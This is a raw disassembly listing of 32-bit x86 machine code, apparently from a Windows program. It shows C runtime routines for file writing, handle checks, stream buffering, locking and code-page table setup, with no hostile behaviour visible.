  403942:	8d 85 2c e5 ff ff    	lea    -0x1ad4(%ebp),%eax
  403948:	50                   	push   %eax
  403949:	8b c3                	mov    %ebx,%eax
  40394b:	2b c6                	sub    %esi,%eax
  40394d:	50                   	push   %eax
  40394e:	8d 84 35 f0 eb ff ff 	lea    -0x1410(%ebp,%esi,1),%eax
  403955:	50                   	push   %eax
  403956:	8b 85 28 e5 ff ff    	mov    -0x1ad8(%ebp),%eax
  40395c:	8b 00                	mov    (%eax),%eax
  40395e:	ff 34 07             	push   (%edi,%eax,1)
  403961:	ff 15 2c a0 40 00    	call   *0x40a02c
  403967:	85 c0                	test   %eax,%eax
  403969:	74 0c                	je     0x403977
  40396b:	03 b5 2c e5 ff ff    	add    -0x1ad4(%ebp),%esi
  403971:	3b de                	cmp    %esi,%ebx
  403973:	7f cb                	jg     0x403940
  403975:	eb 0c                	jmp    0x403983
  403977:	ff 15 8c a0 40 00    	call   *0x40a08c
  40397d:	89 85 40 e5 ff ff    	mov    %eax,-0x1ac0(%ebp)
  403983:	3b de                	cmp    %esi,%ebx
  403985:	7f 5c                	jg     0x4039e3
  403987:	8b 85 44 e5 ff ff    	mov    -0x1abc(%ebp),%eax
  40398d:	2b 85 34 e5 ff ff    	sub    -0x1acc(%ebp),%eax
  403993:	89 85 38 e5 ff ff    	mov    %eax,-0x1ac8(%ebp)
  403999:	3b 45 10             	cmp    0x10(%ebp),%eax
  40399c:	0f 82 0a ff ff ff    	jb     0x4038ac
  4039a2:	eb 3f                	jmp    0x4039e3
  4039a4:	6a 00                	push   $0x0
  4039a6:	8d 8d 2c e5 ff ff    	lea    -0x1ad4(%ebp),%ecx
  4039ac:	51                   	push   %ecx
  4039ad:	ff 75 10             	push   0x10(%ebp)
  4039b0:	ff b5 34 e5 ff ff    	push   -0x1acc(%ebp)
  4039b6:	ff 30                	push   (%eax)
  4039b8:	ff 15 2c a0 40 00    	call   *0x40a02c
  4039be:	85 c0                	test   %eax,%eax
  4039c0:	74 15                	je     0x4039d7
  4039c2:	8b 85 2c e5 ff ff    	mov    -0x1ad4(%ebp),%eax
  4039c8:	83 a5 40 e5 ff ff 00 	andl   $0x0,-0x1ac0(%ebp)
  4039cf:	89 85 38 e5 ff ff    	mov    %eax,-0x1ac8(%ebp)
  4039d5:	eb 0c                	jmp    0x4039e3
  4039d7:	ff 15 8c a0 40 00    	call   *0x40a08c
  4039dd:	89 85 40 e5 ff ff    	mov    %eax,-0x1ac0(%ebp)
  4039e3:	83 bd 38 e5 ff ff 00 	cmpl   $0x0,-0x1ac8(%ebp)
  4039ea:	75 6c                	jne    0x403a58
  4039ec:	83 bd 40 e5 ff ff 00 	cmpl   $0x0,-0x1ac0(%ebp)
  4039f3:	74 2d                	je     0x403a22
  4039f5:	6a 05                	push   $0x5
  4039f7:	5e                   	pop    %esi
  4039f8:	39 b5 40 e5 ff ff    	cmp    %esi,-0x1ac0(%ebp)
  4039fe:	75 14                	jne    0x403a14
  403a00:	e8 7a df ff ff       	call   0x40197f
  403a05:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  403a0b:	e8 82 df ff ff       	call   0x401992
  403a10:	89 30                	mov    %esi,(%eax)
  403a12:	eb 3f                	jmp    0x403a53
  403a14:	ff b5 40 e5 ff ff    	push   -0x1ac0(%ebp)
  403a1a:	e8 86 df ff ff       	call   0x4019a5
  403a1f:	59                   	pop    %ecx
  403a20:	eb 31                	jmp    0x403a53
  403a22:	8b b5 28 e5 ff ff    	mov    -0x1ad8(%ebp),%esi
  403a28:	8b 06                	mov    (%esi),%eax
  403a2a:	f6 44 07 04 40       	testb  $0x40,0x4(%edi,%eax,1)
  403a2f:	74 0f                	je     0x403a40
  403a31:	8b 85 34 e5 ff ff    	mov    -0x1acc(%ebp),%eax
  403a37:	80 38 1a             	cmpb   $0x1a,(%eax)
  403a3a:	75 04                	jne    0x403a40
  403a3c:	33 c0                	xor    %eax,%eax
  403a3e:	eb 24                	jmp    0x403a64
  403a40:	e8 3a df ff ff       	call   0x40197f
  403a45:	c7 00 1c 00 00 00    	movl   $0x1c,(%eax)
  403a4b:	e8 42 df ff ff       	call   0x401992
  403a50:	83 20 00             	andl   $0x0,(%eax)
  403a53:	83 c8 ff             	or     $0xffffffff,%eax
  403a56:	eb 0c                	jmp    0x403a64
  403a58:	8b 85 38 e5 ff ff    	mov    -0x1ac8(%ebp),%eax
  403a5e:	2b 85 30 e5 ff ff    	sub    -0x1ad0(%ebp),%eax
  403a64:	5f                   	pop    %edi
  403a65:	5b                   	pop    %ebx
  403a66:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403a69:	33 cd                	xor    %ebp,%ecx
  403a6b:	5e                   	pop    %esi
  403a6c:	e8 7e 11 00 00       	call   0x404bef
  403a71:	c9                   	leave
  403a72:	c3                   	ret
  403a73:	6a 10                	push   $0x10
  403a75:	68 48 b6 40 00       	push   $0x40b648
  403a7a:	e8 a1 f4 ff ff       	call   0x402f20
  403a7f:	8b 45 08             	mov    0x8(%ebp),%eax
  403a82:	83 f8 fe             	cmp    $0xfffffffe,%eax
  403a85:	75 1b                	jne    0x403aa2
  403a87:	e8 06 df ff ff       	call   0x401992
  403a8c:	83 20 00             	andl   $0x0,(%eax)
  403a8f:	e8 eb de ff ff       	call   0x40197f
  403a94:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  403a9a:	83 c8 ff             	or     $0xffffffff,%eax
  403a9d:	e9 9d 00 00 00       	jmp    0x403b3f
  403aa2:	33 ff                	xor    %edi,%edi
  403aa4:	3b c7                	cmp    %edi,%eax
  403aa6:	7c 08                	jl     0x403ab0
  403aa8:	3b 05 ac f9 40 00    	cmp    0x40f9ac,%eax
  403aae:	72 21                	jb     0x403ad1
  403ab0:	e8 dd de ff ff       	call   0x401992
  403ab5:	89 38                	mov    %edi,(%eax)
  403ab7:	e8 c3 de ff ff       	call   0x40197f
  403abc:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  403ac2:	57                   	push   %edi
  403ac3:	57                   	push   %edi
  403ac4:	57                   	push   %edi
  403ac5:	57                   	push   %edi
  403ac6:	57                   	push   %edi
  403ac7:	e8 4b de ff ff       	call   0x401917
  403acc:	83 c4 14             	add    $0x14,%esp
  403acf:	eb c9                	jmp    0x403a9a
  403ad1:	8b c8                	mov    %eax,%ecx
  403ad3:	c1 f9 05             	sar    $0x5,%ecx
  403ad6:	8d 1c 8d c0 f9 40 00 	lea    0x40f9c0(,%ecx,4),%ebx
  403add:	8b f0                	mov    %eax,%esi
  403adf:	83 e6 1f             	and    $0x1f,%esi
  403ae2:	c1 e6 06             	shl    $0x6,%esi
  403ae5:	8b 0b                	mov    (%ebx),%ecx
  403ae7:	0f be 4c 31 04       	movsbl 0x4(%ecx,%esi,1),%ecx
  403aec:	83 e1 01             	and    $0x1,%ecx
  403aef:	74 bf                	je     0x403ab0
  403af1:	50                   	push   %eax
  403af2:	e8 35 3a 00 00       	call   0x40752c
  403af7:	59                   	pop    %ecx
  403af8:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403afb:	8b 03                	mov    (%ebx),%eax
  403afd:	f6 44 30 04 01       	testb  $0x1,0x4(%eax,%esi,1)
  403b02:	74 16                	je     0x403b1a
  403b04:	ff 75 10             	push   0x10(%ebp)
  403b07:	ff 75 0c             	push   0xc(%ebp)
  403b0a:	ff 75 08             	push   0x8(%ebp)
  403b0d:	e8 2e f8 ff ff       	call   0x403340
  403b12:	83 c4 0c             	add    $0xc,%esp
  403b15:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403b18:	eb 16                	jmp    0x403b30
  403b1a:	e8 60 de ff ff       	call   0x40197f
  403b1f:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  403b25:	e8 68 de ff ff       	call   0x401992
  403b2a:	89 38                	mov    %edi,(%eax)
  403b2c:	83 4d e4 ff          	orl    $0xffffffff,-0x1c(%ebp)
  403b30:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403b37:	e8 09 00 00 00       	call   0x403b45
  403b3c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403b3f:	e8 21 f4 ff ff       	call   0x402f65
  403b44:	c3                   	ret
  403b45:	ff 75 08             	push   0x8(%ebp)
  403b48:	e8 7f 3a 00 00       	call   0x4075cc
  403b4d:	59                   	pop    %ecx
  403b4e:	c3                   	ret
  403b4f:	8b ff                	mov    %edi,%edi
  403b51:	55                   	push   %ebp
  403b52:	8b ec                	mov    %esp,%ebp
  403b54:	ff 05 80 e3 40 00    	incl   0x40e380
  403b5a:	68 00 10 00 00       	push   $0x1000
  403b5f:	e8 36 0d 00 00       	call   0x40489a
  403b64:	59                   	pop    %ecx
  403b65:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403b68:	89 41 08             	mov    %eax,0x8(%ecx)
  403b6b:	85 c0                	test   %eax,%eax
  403b6d:	74 0d                	je     0x403b7c
  403b6f:	83 49 0c 08          	orl    $0x8,0xc(%ecx)
  403b73:	c7 41 18 00 10 00 00 	movl   $0x1000,0x18(%ecx)
  403b7a:	eb 11                	jmp    0x403b8d
  403b7c:	83 49 0c 04          	orl    $0x4,0xc(%ecx)
  403b80:	8d 41 14             	lea    0x14(%ecx),%eax
  403b83:	89 41 08             	mov    %eax,0x8(%ecx)
  403b86:	c7 41 18 02 00 00 00 	movl   $0x2,0x18(%ecx)
  403b8d:	8b 41 08             	mov    0x8(%ecx),%eax
  403b90:	83 61 04 00          	andl   $0x0,0x4(%ecx)
  403b94:	89 01                	mov    %eax,(%ecx)
  403b96:	5d                   	pop    %ebp
  403b97:	c3                   	ret
  403b98:	8b ff                	mov    %edi,%edi
  403b9a:	55                   	push   %ebp
  403b9b:	8b ec                	mov    %esp,%ebp
  403b9d:	8b 45 08             	mov    0x8(%ebp),%eax
  403ba0:	83 f8 fe             	cmp    $0xfffffffe,%eax
  403ba3:	75 0f                	jne    0x403bb4
  403ba5:	e8 d5 dd ff ff       	call   0x40197f
  403baa:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  403bb0:	33 c0                	xor    %eax,%eax
  403bb2:	5d                   	pop    %ebp
  403bb3:	c3                   	ret
  403bb4:	56                   	push   %esi
  403bb5:	33 f6                	xor    %esi,%esi
  403bb7:	3b c6                	cmp    %esi,%eax
  403bb9:	7c 08                	jl     0x403bc3
  403bbb:	3b 05 ac f9 40 00    	cmp    0x40f9ac,%eax
  403bc1:	72 1c                	jb     0x403bdf
  403bc3:	e8 b7 dd ff ff       	call   0x40197f
  403bc8:	56                   	push   %esi
  403bc9:	56                   	push   %esi
  403bca:	56                   	push   %esi
  403bcb:	56                   	push   %esi
  403bcc:	56                   	push   %esi
  403bcd:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  403bd3:	e8 3f dd ff ff       	call   0x401917
  403bd8:	83 c4 14             	add    $0x14,%esp
  403bdb:	33 c0                	xor    %eax,%eax
  403bdd:	eb 1a                	jmp    0x403bf9
  403bdf:	8b c8                	mov    %eax,%ecx
  403be1:	83 e0 1f             	and    $0x1f,%eax
  403be4:	c1 f9 05             	sar    $0x5,%ecx
  403be7:	8b 0c 8d c0 f9 40 00 	mov    0x40f9c0(,%ecx,4),%ecx
  403bee:	c1 e0 06             	shl    $0x6,%eax
  403bf1:	0f be 44 01 04       	movsbl 0x4(%ecx,%eax,1),%eax
  403bf6:	83 e0 40             	and    $0x40,%eax
  403bf9:	5e                   	pop    %esi
  403bfa:	5d                   	pop    %ebp
  403bfb:	c3                   	ret
  403bfc:	b8 a0 d2 40 00       	mov    $0x40d2a0,%eax
  403c01:	c3                   	ret
  403c02:	a1 a0 f9 40 00       	mov    0x40f9a0,%eax
  403c07:	56                   	push   %esi
  403c08:	6a 14                	push   $0x14
  403c0a:	5e                   	pop    %esi
  403c0b:	85 c0                	test   %eax,%eax
  403c0d:	75 07                	jne    0x403c16
  403c0f:	b8 00 02 00 00       	mov    $0x200,%eax
  403c14:	eb 06                	jmp    0x403c1c
  403c16:	3b c6                	cmp    %esi,%eax
  403c18:	7d 07                	jge    0x403c21
  403c1a:	8b c6                	mov    %esi,%eax
  403c1c:	a3 a0 f9 40 00       	mov    %eax,0x40f9a0
  403c21:	6a 04                	push   $0x4
  403c23:	50                   	push   %eax
  403c24:	e8 b6 0c 00 00       	call   0x4048df
  403c29:	59                   	pop    %ecx
  403c2a:	59                   	pop    %ecx
  403c2b:	a3 80 e9 40 00       	mov    %eax,0x40e980
  403c30:	85 c0                	test   %eax,%eax
  403c32:	75 1e                	jne    0x403c52
  403c34:	6a 04                	push   $0x4
  403c36:	56                   	push   %esi
  403c37:	89 35 a0 f9 40 00    	mov    %esi,0x40f9a0
  403c3d:	e8 9d 0c 00 00       	call   0x4048df
  403c42:	59                   	pop    %ecx
  403c43:	59                   	pop    %ecx
  403c44:	a3 80 e9 40 00       	mov    %eax,0x40e980
  403c49:	85 c0                	test   %eax,%eax
  403c4b:	75 05                	jne    0x403c52
  403c4d:	6a 1a                	push   $0x1a
  403c4f:	58                   	pop    %eax
  403c50:	5e                   	pop    %esi
  403c51:	c3                   	ret
  403c52:	33 d2                	xor    %edx,%edx
  403c54:	b9 a0 d2 40 00       	mov    $0x40d2a0,%ecx
  403c59:	eb 05                	jmp    0x403c60
  403c5b:	a1 80 e9 40 00       	mov    0x40e980,%eax
  403c60:	89 0c 02             	mov    %ecx,(%edx,%eax,1)
  403c63:	83 c1 20             	add    $0x20,%ecx
  403c66:	83 c2 04             	add    $0x4,%edx
  403c69:	81 f9 20 d5 40 00    	cmp    $0x40d520,%ecx
  403c6f:	7c ea                	jl     0x403c5b
  403c71:	6a fe                	push   $0xfffffffe
  403c73:	5e                   	pop    %esi
  403c74:	33 d2                	xor    %edx,%edx
  403c76:	b9 b0 d2 40 00       	mov    $0x40d2b0,%ecx
  403c7b:	57                   	push   %edi
  403c7c:	8b c2                	mov    %edx,%eax
  403c7e:	c1 f8 05             	sar    $0x5,%eax
  403c81:	8b 04 85 c0 f9 40 00 	mov    0x40f9c0(,%eax,4),%eax
  403c88:	8b fa                	mov    %edx,%edi
  403c8a:	83 e7 1f             	and    $0x1f,%edi
  403c8d:	c1 e7 06             	shl    $0x6,%edi
  403c90:	8b 04 07             	mov    (%edi,%eax,1),%eax
  403c93:	83 f8 ff             	cmp    $0xffffffff,%eax
  403c96:	74 08                	je     0x403ca0
  403c98:	3b c6                	cmp    %esi,%eax
  403c9a:	74 04                	je     0x403ca0
  403c9c:	85 c0                	test   %eax,%eax
  403c9e:	75 02                	jne    0x403ca2
  403ca0:	89 31                	mov    %esi,(%ecx)
  403ca2:	83 c1 20             	add    $0x20,%ecx
  403ca5:	42                   	inc    %edx
  403ca6:	81 f9 10 d3 40 00    	cmp    $0x40d310,%ecx
  403cac:	7c ce                	jl     0x403c7c
  403cae:	5f                   	pop    %edi
  403caf:	33 c0                	xor    %eax,%eax
  403cb1:	5e                   	pop    %esi
  403cb2:	c3                   	ret
  403cb3:	e8 8c 3d 00 00       	call   0x407a44
  403cb8:	80 3d 38 df 40 00 00 	cmpb   $0x0,0x40df38
  403cbf:	74 05                	je     0x403cc6
  403cc1:	e8 55 3b 00 00       	call   0x40781b
  403cc6:	ff 35 80 e9 40 00    	push   0x40e980
  403ccc:	e8 1a 0b 00 00       	call   0x4047eb
  403cd1:	59                   	pop    %ecx
  403cd2:	c3                   	ret
  403cd3:	8b ff                	mov    %edi,%edi
  403cd5:	55                   	push   %ebp
  403cd6:	8b ec                	mov    %esp,%ebp
  403cd8:	56                   	push   %esi
  403cd9:	8b 75 08             	mov    0x8(%ebp),%esi
  403cdc:	b8 a0 d2 40 00       	mov    $0x40d2a0,%eax
  403ce1:	3b f0                	cmp    %eax,%esi
  403ce3:	72 22                	jb     0x403d07
  403ce5:	81 fe 00 d5 40 00    	cmp    $0x40d500,%esi
  403ceb:	77 1a                	ja     0x403d07
  403ced:	8b ce                	mov    %esi,%ecx
  403cef:	2b c8                	sub    %eax,%ecx
  403cf1:	c1 f9 05             	sar    $0x5,%ecx
  403cf4:	83 c1 10             	add    $0x10,%ecx
  403cf7:	51                   	push   %ecx
  403cf8:	e8 59 1e 00 00       	call   0x405b56
  403cfd:	81 4e 0c 00 80 00 00 	orl    $0x8000,0xc(%esi)
  403d04:	59                   	pop    %ecx
  403d05:	eb 0a                	jmp    0x403d11
  403d07:	83 c6 20             	add    $0x20,%esi
  403d0a:	56                   	push   %esi
  403d0b:	ff 15 e4 a0 40 00    	call   *0x40a0e4
  403d11:	5e                   	pop    %esi
  403d12:	5d                   	pop    %ebp
  403d13:	c3                   	ret
  403d14:	8b ff                	mov    %edi,%edi
  403d16:	55                   	push   %ebp
  403d17:	8b ec                	mov    %esp,%ebp
  403d19:	8b 45 08             	mov    0x8(%ebp),%eax
  403d1c:	83 f8 14             	cmp    $0x14,%eax
  403d1f:	7d 16                	jge    0x403d37
  403d21:	83 c0 10             	add    $0x10,%eax
  403d24:	50                   	push   %eax
  403d25:	e8 2c 1e 00 00       	call   0x405b56
  403d2a:	8b 45 0c             	mov    0xc(%ebp),%eax
  403d2d:	81 48 0c 00 80 00 00 	orl    $0x8000,0xc(%eax)
  403d34:	59                   	pop    %ecx
  403d35:	5d                   	pop    %ebp
  403d36:	c3                   	ret
  403d37:	8b 45 0c             	mov    0xc(%ebp),%eax
  403d3a:	83 c0 20             	add    $0x20,%eax
  403d3d:	50                   	push   %eax
  403d3e:	ff 15 e4 a0 40 00    	call   *0x40a0e4
  403d44:	5d                   	pop    %ebp
  403d45:	c3                   	ret
  403d46:	8b ff                	mov    %edi,%edi
  403d48:	55                   	push   %ebp
  403d49:	8b ec                	mov    %esp,%ebp
  403d4b:	8b 45 08             	mov    0x8(%ebp),%eax
  403d4e:	b9 a0 d2 40 00       	mov    $0x40d2a0,%ecx
  403d53:	3b c1                	cmp    %ecx,%eax
  403d55:	72 1f                	jb     0x403d76
  403d57:	3d 00 d5 40 00       	cmp    $0x40d500,%eax
  403d5c:	77 18                	ja     0x403d76
  403d5e:	81 60 0c ff 7f ff ff 	andl   $0xffff7fff,0xc(%eax)
  403d65:	2b c1                	sub    %ecx,%eax
  403d67:	c1 f8 05             	sar    $0x5,%eax
  403d6a:	83 c0 10             	add    $0x10,%eax
  403d6d:	50                   	push   %eax
  403d6e:	e8 09 1d 00 00       	call   0x405a7c
  403d73:	59                   	pop    %ecx
  403d74:	5d                   	pop    %ebp
  403d75:	c3                   	ret
  403d76:	83 c0 20             	add    $0x20,%eax
  403d79:	50                   	push   %eax
  403d7a:	ff 15 e8 a0 40 00    	call   *0x40a0e8
  403d80:	5d                   	pop    %ebp
  403d81:	c3                   	ret
  403d82:	8b ff                	mov    %edi,%edi
  403d84:	55                   	push   %ebp
  403d85:	8b ec                	mov    %esp,%ebp
  403d87:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403d8a:	83 f9 14             	cmp    $0x14,%ecx
  403d8d:	8b 45 0c             	mov    0xc(%ebp),%eax
  403d90:	7d 13                	jge    0x403da5
  403d92:	81 60 0c ff 7f ff ff 	andl   $0xffff7fff,0xc(%eax)
  403d99:	83 c1 10             	add    $0x10,%ecx
  403d9c:	51                   	push   %ecx
  403d9d:	e8 da 1c 00 00       	call   0x405a7c
  403da2:	59                   	pop    %ecx
  403da3:	5d                   	pop    %ebp
  403da4:	c3                   	ret
  403da5:	83 c0 20             	add    $0x20,%eax
  403da8:	50                   	push   %eax
  403da9:	ff 15 e8 a0 40 00    	call   *0x40a0e8
  403daf:	5d                   	pop    %ebp
  403db0:	c3                   	ret
  403db1:	8b ff                	mov    %edi,%edi
  403db3:	55                   	push   %ebp
  403db4:	8b ec                	mov    %esp,%ebp
  403db6:	8b 45 08             	mov    0x8(%ebp),%eax
  403db9:	56                   	push   %esi
  403dba:	33 f6                	xor    %esi,%esi
  403dbc:	3b c6                	cmp    %esi,%eax
  403dbe:	75 1d                	jne    0x403ddd
  403dc0:	e8 ba db ff ff       	call   0x40197f
  403dc5:	56                   	push   %esi
  403dc6:	56                   	push   %esi
  403dc7:	56                   	push   %esi
  403dc8:	56                   	push   %esi
  403dc9:	56                   	push   %esi
  403dca:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  403dd0:	e8 42 db ff ff       	call   0x401917
  403dd5:	83 c4 14             	add    $0x14,%esp
  403dd8:	83 c8 ff             	or     $0xffffffff,%eax
  403ddb:	eb 03                	jmp    0x403de0
  403ddd:	8b 40 10             	mov    0x10(%eax),%eax
  403de0:	5e                   	pop    %esi
  403de1:	5d                   	pop    %ebp
  403de2:	c3                   	ret
  403de3:	2d a4 03 00 00       	sub    $0x3a4,%eax
  403de8:	74 22                	je     0x403e0c
  403dea:	83 e8 04             	sub    $0x4,%eax
  403ded:	74 17                	je     0x403e06
  403def:	83 e8 0d             	sub    $0xd,%eax
  403df2:	74 0c                	je     0x403e00
  403df4:	48                   	dec    %eax
  403df5:	74 03                	je     0x403dfa
  403df7:	33 c0                	xor    %eax,%eax
  403df9:	c3                   	ret
  403dfa:	b8 04 04 00 00       	mov    $0x404,%eax
  403dff:	c3                   	ret
  403e00:	b8 12 04 00 00       	mov    $0x412,%eax
  403e05:	c3                   	ret
  403e06:	b8 04 08 00 00       	mov    $0x804,%eax
  403e0b:	c3                   	ret
  403e0c:	b8 11 04 00 00       	mov    $0x411,%eax
  403e11:	c3                   	ret
  403e12:	8b ff                	mov    %edi,%edi
  403e14:	56                   	push   %esi
  403e15:	57                   	push   %edi
  403e16:	8b f0                	mov    %eax,%esi
  403e18:	68 01 01 00 00       	push   $0x101
  403e1d:	33 ff                	xor    %edi,%edi
  403e1f:	8d 46 1c             	lea    0x1c(%esi),%eax
  403e22:	57                   	push   %edi
  403e23:	50                   	push   %eax
  403e24:	e8 77 0e 00 00       	call   0x404ca0
  403e29:	33 c0                	xor    %eax,%eax
  403e2b:	0f b7 c8             	movzwl %ax,%ecx
  403e2e:	8b c1                	mov    %ecx,%eax
  403e30:	89 7e 04             	mov    %edi,0x4(%esi)
  403e33:	89 7e 08             	mov    %edi,0x8(%esi)
  403e36:	89 7e 0c             	mov    %edi,0xc(%esi)
  403e39:	c1 e1 10             	shl    $0x10,%ecx
  403e3c:	0b c1                	or     %ecx,%eax
  403e3e:	8d 7e 10             	lea    0x10(%esi),%edi
  403e41:	ab                   	stos   %eax,%es:(%edi)
  403e42:	ab                   	stos   %eax,%es:(%edi)
  403e43:	ab                   	stos   %eax,%es:(%edi)
  403e44:	b9 20 d5 40 00       	mov    $0x40d520,%ecx
  403e49:	83 c4 0c             	add    $0xc,%esp
  403e4c:	8d 46 1c             	lea    0x1c(%esi),%eax
  403e4f:	2b ce                	sub    %esi,%ecx
  403e51:	bf 01 01 00 00       	mov    $0x101,%edi
  403e56:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  403e59:	88 10                	mov    %dl,(%eax)
  403e5b:	40                   	inc    %eax
  403e5c:	4f                   	dec    %edi
  403e5d:	75 f7                	jne    0x403e56
  403e5f:	8d 86 1d 01 00 00    	lea    0x11d(%esi),%eax
  403e65:	be 00 01 00 00       	mov    $0x100,%esi
  403e6a:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  403e6d:	88 10                	mov    %dl,(%eax)
  403e6f:	40                   	inc    %eax
  403e70:	4e                   	dec    %esi
  403e71:	75 f7                	jne    0x403e6a
  403e73:	5f                   	pop    %edi
  403e74:	5e                   	pop    %esi
  403e75:	c3                   	ret
  403e76:	8b ff                	mov    %edi,%edi
  403e78:	55                   	push   %ebp
  403e79:	8b ec                	mov    %esp,%ebp
  403e7b:	81 ec 1c 05 00 00    	sub    $0x51c,%esp
  403e81:	a1 60 db 40 00       	mov    0x40db60,%eax
  403e86:	33 c5                	xor    %ebp,%eax
  403e88:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403e8b:	53                   	push   %ebx
  403e8c:	57                   	push   %edi
  403e8d:	8d 85 e8 fa ff ff    	lea    -0x518(%ebp),%eax
  403e93:	50                   	push   %eax
  403e94:	ff 76 04             	push   0x4(%esi)
  403e97:	ff 15 ec a0 40 00    	call   *0x40a0ec
  403e9d:	bf 00 01 00 00       	mov    $0x100,%edi
  403ea2:	85 c0                	test   %eax,%eax
  403ea4:	0f 84 fb 00 00 00    	je     0x403fa5
  403eaa:	33 c0                	xor    %eax,%eax
  403eac:	88 84 05 fc fe ff ff 	mov    %al,-0x104(%ebp,%eax,1)
  403eb3:	40                   	inc    %eax
  403eb4:	3b c7                	cmp    %edi,%eax
  403eb6:	72 f4                	jb     0x403eac
  403eb8:	8a 85 ee fa ff ff    	mov    -0x512(%ebp),%al
  403ebe:	c6 85 fc fe ff ff 20 	movb   $0x20,-0x104(%ebp)
  403ec5:	84 c0                	test   %al,%al
  403ec7:	74 2e                	je     0x403ef7
  403ec9:	8d 9d ef fa ff ff    	lea    -0x511(%ebp),%ebx
  403ecf:	0f b6 c8             	movzbl %al,%ecx
  403ed2:	0f b6 03             	movzbl (%ebx),%eax
  403ed5:	3b c8                	cmp    %eax,%ecx
  403ed7:	77 16                	ja     0x403eef
  403ed9:	2b c1                	sub    %ecx,%eax
  403edb:	40                   	inc    %eax
  403edc:	50                   	push   %eax
  403edd:	8d 94 0d fc fe ff ff 	lea    -0x104(%ebp,%ecx,1),%edx
  403ee4:	6a 20                	push   $0x20
  403ee6:	52                   	push   %edx
  403ee7:	e8 b4 0d 00 00       	call   0x404ca0
  403eec:	83 c4 0c             	add    $0xc,%esp
  403eef:	43                   	inc    %ebx
  403ef0:	8a 03                	mov    (%ebx),%al
  403ef2:	43                   	inc    %ebx
  403ef3:	84 c0                	test   %al,%al
  403ef5:	75 d8                	jne    0x403ecf
  403ef7:	6a 00                	push   $0x0
  403ef9:	ff 76 0c             	push   0xc(%esi)
  403efc:	8d 85 fc fa ff ff    	lea    -0x504(%ebp),%eax
  403f02:	ff 76 04             	push   0x4(%esi)
  403f05:	50                   	push   %eax
  403f06:	57                   	push   %edi
  403f07:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  403f0d:	50                   	push   %eax
  403f0e:	6a 01                	push   $0x1
  403f10:	6a 00                	push   $0x0
  403f12:	e8 fa 40 00 00       	call   0x408011
  403f17:	33 db                	xor    %ebx,%ebx
  403f19:	53                   	push   %ebx
  403f1a:	ff 76 04             	push   0x4(%esi)
  403f1d:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  403f23:	57                   	push   %edi
  403f24:	50                   	push   %eax
  403f25:	57                   	push   %edi
  403f26:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  403f2c:	50                   	push   %eax
  403f2d:	57                   	push   %edi
  403f2e:	ff 76 0c             	push   0xc(%esi)
  403f31:	53                   	push   %ebx
  403f32:	e8 db 3e 00 00       	call   0x407e12
  403f37:	83 c4 44             	add    $0x44,%esp
  403f3a:	53                   	push   %ebx
  403f3b:	ff 76 04             	push   0x4(%esi)
  403f3e:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  403f44:	57                   	push   %edi
  403f45:	50                   	push   %eax
  403f46:	57                   	push   %edi
  403f47:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  403f4d:	50                   	push   %eax
  403f4e:	68 00 02 00 00       	push   $0x200
  403f53:	ff 76 0c             	push   0xc(%esi)
  403f56:	53                   	push   %ebx
  403f57:	e8 b6 3e 00 00       	call   0x407e12
  403f5c:	83 c4 24             	add    $0x24,%esp
  403f5f:	33 c0                	xor    %eax,%eax
  403f61:	0f b7 8c 45 fc fa ff 	movzwl -0x504(%ebp,%eax,2),%ecx
  403f68:	ff 
  403f69:	f6 c1 01             	test   $0x1,%cl
  403f6c:	74 0e                	je     0x403f7c
  403f6e:	80 4c 06 1d 10       	orb    $0x10,0x1d(%esi,%eax,1)
  403f73:	8a 8c 05 fc fd ff ff 	mov    -0x204(%ebp,%eax,1),%cl
  403f7a:	eb 11                	jmp    0x403f8d
  403f7c:	f6 c1 02             	test   $0x2,%cl
  403f7f:	74 15                	je     0x403f96
  403f81:	80 4c 06 1d 20       	orb    $0x20,0x1d(%esi,%eax,1)
  403f86:	8a 8c 05 fc fc ff ff 	mov    -0x304(%ebp,%eax,1),%cl
  403f8d:	88 8c 06 1d 01 00 00 	mov    %cl,0x11d(%esi,%eax,1)
  403f94:	eb 08                	jmp    0x403f9e
  403f96:	c6 84 06 1d 01 00 00 	movb   $0x0,0x11d(%esi,%eax,1)
  403f9d:	00 
  403f9e:	40                   	inc    %eax
  403f9f:	3b c7                	cmp    %edi,%eax
  403fa1:	72 be                	jb     0x403f61
  403fa3:	eb 56                	jmp    0x403ffb
  403fa5:	8d 86 1d 01 00 00    	lea    0x11d(%esi),%eax
  403fab:	c7 85 e4 fa ff ff 9f 	movl   $0xffffff9f,-0x51c(%ebp)
  403fb2:	ff ff ff 
  403fb5:	33 c9                	xor    %ecx,%ecx
  403fb7:	29 85 e4 fa ff ff    	sub    %eax,-0x51c(%ebp)
  403fbd:	8b 95 e4 fa ff ff    	mov    -0x51c(%ebp),%edx
  403fc3:	8d 84 0e 1d 01 00 00 	lea    0x11d(%esi,%ecx,1),%eax
  403fca:	03 d0                	add    %eax,%edx
  403fcc:	8d 5a 20             	lea    0x20(%edx),%ebx
  403fcf:	83 fb 19             	cmp    $0x19,%ebx
  403fd2:	77 0c                	ja     0x403fe0
  403fd4:	80 4c 0e 1d 10       	orb    $0x10,0x1d(%esi,%ecx,1)
  403fd9:	8a d1                	mov    %cl,%dl
  403fdb:	80 c2 20             	add    $0x20,%dl
  403fde:	eb 0f                	jmp    0x403fef
  403fe0:	83 fa 19             	cmp    $0x19,%edx
  403fe3:	77 0e                	ja     0x403ff3
